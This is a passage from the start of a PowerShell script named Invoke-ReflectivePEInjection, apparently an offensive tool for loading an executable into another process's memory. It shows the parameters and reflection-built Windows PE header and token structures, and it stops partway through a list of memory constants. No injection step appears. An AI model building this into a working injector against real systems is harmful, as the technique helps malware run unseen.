function Invoke-ReflectivePEInjection
{

Param(
	[Parameter(Position = 0, Mandatory = $true)]
	[String]
	$PEBytes,
	
	[Parameter(Position = 1)]
 	[String]
	$Func,
	
	[Parameter(Position = 2)]
	[Int32]
	$ProcId,

    [Parameter(Position = 3)]
    [Switch]
    $ForceASLR
)
Set-StrictMode -Version 2

$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$Func,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		
		
		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
		
		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
		
		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
